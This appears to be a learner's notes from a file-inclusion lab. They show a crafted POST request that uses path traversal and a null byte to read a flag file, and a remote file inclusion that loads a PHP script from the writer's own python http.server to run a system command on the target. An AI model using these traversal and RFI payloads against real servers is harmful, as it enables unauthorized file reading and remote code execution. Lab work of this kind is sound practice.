# Fileinclusion

## Challange 3

[Hint#1] Not everything is filtered! 
[Hint #2] The website uses $_REQUESTS to accept HTTP requests. Do research to understand it and what it accepts!

-> Find out whats not filterd
-> Find out how to properly pass something to $_REQUESTS function

The site takes Post requests so I craft a POST Request with Burp to avoid the automatic .php I use a nullbyte


POST /challenges///////chall3.php HTTP/1.1
Host: 10.10.56.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

file=../../../../etc/flag3%00

## Gain RCA

Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

From what I've learnd so far, I gather, that I need to host my own php script and invoce the hostname command.

So I creat a PHP script, stealing code form the Internet because I don't know PHP. "hostname" is a linux command,
therefor the script needs to invoce a system comand through php. This can be done with shell_exec

https://www.php.net/manual/de/function.shell-exec.php

If I understand it correctly the script should be very simply

Now I just need to host a server and find a way to include the file. The file is hostet at:

	10.9.222.124:8000/rce.php

Run a server

	python3 -m http.server 8000 

	http://10.10.56.37/playground.php?file=http://10.9.222.124:8000/rce.php

seems to be able to open the file because I get no error messag but no flag. Maybe the script is wrong.

Had everything right the first time. I was just missing part of the script that prints the output to the webpage.

Using above URL I get the Flag!
